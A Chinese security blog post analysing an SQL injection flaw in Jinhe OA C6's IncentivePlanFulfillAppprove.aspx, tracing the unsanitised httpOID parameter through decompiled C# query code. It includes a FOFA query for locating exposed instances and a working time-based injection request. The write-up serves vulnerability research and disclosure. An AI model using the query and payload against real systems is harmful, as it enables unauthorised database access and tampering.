---
title: "金和OA C6 IncentivePlanFulfillAppprove.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-IncentivePlan-httpOID-sqli.html
asset_dir: assets/金和oa-c6-incentiveplanfulfillappprove.aspx-sql注入漏洞
---

# 金和OA C6 IncentivePlanFulfillAppprove.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/25 18:26
- 1038浏览
- [0评论](#comment)
- 1小时阅读

深入探索

软件

计算机安全

SQL

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 IncentivePlanFulfillAppprove.aspx接口处存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# fofa语法

> `app="金和网络-金和OA"`

# 漏洞分析

> 默认的 TVersion 值为 0

根据 JHSoft.Web.IncentivePlan/IncentivePlanFulfillAppprove.aspx 文件内容

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="IncentivePlanFulfillAppprove.aspx.cs" Inherits="JHSoft.Web.IncentivePlan.IncentivePlanFulfillAppprove" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
    <div>

    </div>
    </form>
</body>
</html>
```

找到 IncentivePlanFulfillAppprove.cs 的对应业务逻辑实现

代码安全审计

```
protected void Page_Load(object sender, EventArgs e)
{
  this.PageGlobalization();
  this.strUserCode = this.Session["UserCode"] != null ? this.Session["UserCode"].ToString() : string.Empty;
  this.strUserName = this.Session["UserName"] != null ? this.Session["UserName"].ToString() : string.Empty;
  this.strDeptID = this.Session["DeptID"] != null ? this.Session["DeptID"].ToString() : string.Empty;
  this.TPlanID = this.Request["httpOID"] != null ? this.Request["httpOID"] : "0";
  if (string.op_Equality(this.TPlanID, ""))
  {
    this.Response.Write("页面数据错误。。。");
  }
  else
  {
    this.intApproveID = this.Request["httpAppID"] != null ? Convert.ToInt32(this.Request["httpAppID"]) : 0;
    this.GetPlanInfoInit();
    this.WorkFlowInit();
  }
}
```

页面加载时

漏洞预警服务

- 读取HTTP请求中的httpOID参数，如果请求中没有此参数，则默认为"0"。
- 判断TPlanID（即httpOID参数）是否为空字符串，如果是响应“页面数据错误。。。”。
- 读取HTTP请求中的httpAppID参数，如果请求中没有此参数，则默认为0。
- 调用 GetPlanInfoInit 方法 和 WorkFlowInit 方法

## GetPlanInfoInit 方法业务逻辑如下

```
private void GetPlanInfoInit()
{
  JHSoft.IncentivePlan.BLL.IncentivePlan incentivePlan1 = new JHSoft.IncentivePlan.BLL.IncentivePlan();
  this.TVersion = Convert.ToString(incentivePlan1.GetCurrentPlanVersion(this.TPlanID));
  JHSoft.IncentivePlan.Model.IncentivePlan incentivePlanMessageById = incentivePlan1.GetIncentivePlanMessageById(this.TPlanID, this.TVersion);
  if (incentivePlanMessageById.IncentiveTitle == null)
  {
    this.Response.Write("页面数据错误。。。");
  }
```

- 调用 `GetCurrentPlanVersion` 和 `GetIncentivePlanMessageById` 方法，获取计划的当前版本和完整的计划详情。
- 如果计划的标题（`IncentiveTitle`）为空，则直接输出错误信息 `"页面数据错误。。。"`，停止后续处理。

### 漏洞点

```
this.TVersion = Convert.ToString(incentivePlan1.GetCurrentPlanVersion(this.TPlanID));
JHSoft.IncentivePlan.Model.IncentivePlan incentivePlanMessageById = incentivePlan1.GetIncentivePlanMessageById(this.TPlanID, this.TVersion);
```

先将 TPlanID 代入 `new JHSoft.IncentivePlan.BLL.IncentivePlan().GetCurrentPlanVersion` 获取版本号 TVersion，然后再将其和 TPlanID 一起代入 `new JHSoft.IncentivePlan.BLL.GetIncentivePlanMessageById` 函数中。

数据管理

而 `GetCurrentPlanVersion` 函数实现逻辑如下

```
public int GetCurrentPlanVersion(string TPlanID)
{
  DataTable dataTable = this.Conn.ExecSQLReDataTable("SELECT incentiveversion as MV FROM dbo.IncentivePlan WHERE IsCurrentVersion=1 and IncentiveId=" + TPlanID);
  int currentPlanVersion = 0;
  if (dataTable != null && ((InternalDataCollectionBase) dataTable.Rows).Count > 0)
    currentPlanVersion = Convert.ToInt32(dataTable.Rows[0][0]);
  return currentPlanVersion;
}
```

直接将 TPlanID 拼接进SQL语句的where语句后，造成SQL注入漏洞，非常简单。

再看 `GetIncentivePlanMessageById` 函数的业务逻辑部分

```
public JHSoft.IncentivePlan.Model.IncentivePlan GetIncentivePlanMessageById(
  string TPlanID,
  string TVersion)
{
  JHSoft.IncentivePlan.Model.IncentivePlan incentivePlanMessageById = new JHSoft.IncentivePlan.Model.IncentivePlan();
  StringBuilder stringBuilder = new StringBuilder();
  stringBuilder.Append("select IncentiveID,IncentiveVersion,IncentiveTitle,IncentiveContent,IncentiveYear,IncentivePeriod,IncentiveType,CreateUser,CreateTime,IncentiveTemplet,AppFlag,FulfillContent,FulfillMark,FulfillUser,FulfillTime,DelFlag,GrantDept,GrantUser,IncentiveDept,IncentiveUser,IncentiveTargetDesc,IsCurrentVersion");
  stringBuilder.Append(" FROM IncentivePlan ");
  if (string.op_Inequality(TPlanID.Trim(), ""))
    stringBuilder.Append(" where IncentiveID=" + TPlanID + " and IncentiveVersion=" + TVersion);
  DataTable dataTable = this.Conn.ExecSQLReDataTable(stringBuilder.ToString());
  if (this.Conn.IsError)
```

同样是将之前获取的 TVersion 和 TPlanID 直接拼接进SQL语句where语句中，造成SQL注入漏洞。

计算机服务器

## WorkFlowInit 方法业务逻辑如下

```
private void WorkFlowInit()
    {
      this.ToolBarTargetPlan.ButtonsTotals = 10;
      this.ToolBarTargetPlan.IntIsNew = 1;
      this.ToolBarTargetPlan.AppTID = "IOA_IncentivePlanFulfill";
      this.ToolBarTargetPlan.GroupCode = "";
      this.ToolBarTargetPlan.CurURL = "../JHSoft.Web.WorkFlow";
      this.ToolBarTargetPlan.CurUserID = this.strUserCode;
      this.ToolBarTargetPlan.CurUserName = this.strUserName;
      this.ToolBarTargetPlan.CurDeptID = this.strDeptID;
      this.ToolBarTargetPlan.ButtonClick += new ToolBar.ButtonEventHandler(this.ToolBarTargetPlan_ButtonClick);
      if (this.Request.QueryString["From"] == null)
        return;
      string.op_Equality(this.Request.QueryString["From"], "GiveOutShow");
    }

private void ToolBarTargetPlan_ButtonClick(object source, string ButtonName)
{
  string str;
  if ((str = this.ToolBarTargetPlan.ButtonDAType.Trim()) != null)
  {
    if (!string.op_Equality(str, "9"))
    {
      if (string.op_Equality(str, "8"))
      {
        this.InPlan.DeleteIncentivePlan(this.TPlanID, this.TVersion, "1");
        goto label_6;
      }
    }
    else
    {
      this.InPlan.UpdatePlanAppFlag(this.TPlanID, this.TVersion, (this.ToolBarTargetPlan.PassFlag == 1 ? 4 : -1).ToString());
      goto label_6;
    }
  }
  this.InPlan.UpdatePlanAppFlag(this.TPlanID, this.TVersion, 3.ToString());
label_6:
  this.ToolBarTargetPlan.AppOID = Convert.ToInt32(this.TPlanID);
  this.ToolBarTargetPlan.AppTitle = ((HtmlContainerControl) this.TIncentiveTitle).InnerHtml + "兑现审批流程";
  this.ToolBarTargetPlan.SaveFormFlag = true;
  ((Control) this).Page.RegisterStartupScript("success", "<script>ToInMain();</script>");
}
```

**判断** **`ButtonDAType`**的值：

- 如果 `ButtonDAType` 的值为 `"9"`：
  - 调用 `UpdatePlanAppFlag` 方法，更新计划的审批状态标志（`AppFlag`）。具体值取决于 `PassFlag` 是否为 `1`，如果是，则设置为 `4`，否则设置为 `-1`。
- 如果 `ButtonDAType` 的值为 `"8"`：
  - 调用 `DeleteIncentivePlan` 方法，删除激励计划。传入的参数包括 `TPlanID`（计划ID）、`TVersion`（版本号）以及一个固定值 `"1"`。
- 其他情况：
  - 调用 `UpdatePlanAppFlag` 方法，将审批状态标志更新为 `3`。

### 漏洞点

`DeleteIncentivePlan` 函数

```
public bool DeleteIncentivePlan(string PlanID, string Version, string DelFlag)
{
  StringBuilder stringBuilder = new StringBuilder();
  stringBuilder.AppendFormat("update IncentivePlan set IsCurrentVersion=0 where IncentiveID={0}", (object) PlanID);
  stringBuilder.AppendFormat("update IncentivePlan set ", new object[0]);
  stringBuilder.Append("IsCurrentVersion=1,");
  stringBuilder.AppendFormat("DelFlag={0}", (object) DelFlag);
  stringBuilder.AppendFormat(" where IncentiveID={0} and IncentiveVersion={1} ", (object) PlanID, (object) Version);
  this.Conn.ExecSQLReInt(stringBuilder.ToString());
  if (this.Conn.IsError)
  {
    this.IsErr = true;
    this.ErrMessage = this.Conn.ErrorMessage;
  }
  return this.Conn.IsError;
}
```

直接将 PlanID 参数拼接进SQL语句，造成[SQL注入漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

`UpdatePlanAppFlag` 函数的漏洞原理同上。

漏洞预警服务

```
public bool UpdatePlanAppFlag(string PlanID, string Version, string Flag)
{
  StringBuilder stringBuilder = new StringBuilder();
  stringBuilder.AppendFormat(" update IncentivePlan set IsCurrentVersion=0 where IncentiveID={0} ", (object) PlanID);
  stringBuilder.AppendFormat("update IncentivePlan set ", new object[0]);
  stringBuilder.AppendFormat(" AppFlag={0},", (object) Flag);
  stringBuilder.Append(" IsCurrentVersion=1");
  if (string.op_Equality(Flag, "1"))
    stringBuilder.AppendFormat(",IsEdit=0,EditUser=''", new object[0]);
  stringBuilder.AppendFormat(" where IncentiveID={0} and IncentiveVersion={1} ", (object) PlanID, (object) Version);
  this.Conn.ExecSQLReInt(stringBuilder.ToString());
  if (this.Conn.IsError)
  {
    this.IsErr = true;
    this.ErrMessage = this.Conn.ErrorMessage;
  }
  return !this.Conn.IsError;
}
```

# 漏洞复现

```
GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfillAppprove.aspx/?httpOID=1;WAITFOR+DELAY'0:0:2'-- HTTP/1.1
Host: jhsoft.mrxn.net
```

成功延时 4 秒（执行两次）

编程

[![金和OA C6 IncentivePlanFulfillAppprove.aspx SQL注入漏洞](images/img-001-bdcd02f31dce.webp)](https://image.mrxn.net/064b31f3b20b4fcbab97d764af79faf4.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [3.1.GetPlanInfoInit 方法业务逻辑如下](#toc-3-1-)
- [3.1.1.漏洞点](#toc-3-1-1-)
- [3.2.WorkFlowInit 方法业务逻辑如下](#toc-3-2-)
- [3.2.1.漏洞点](#toc-3-2-1-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
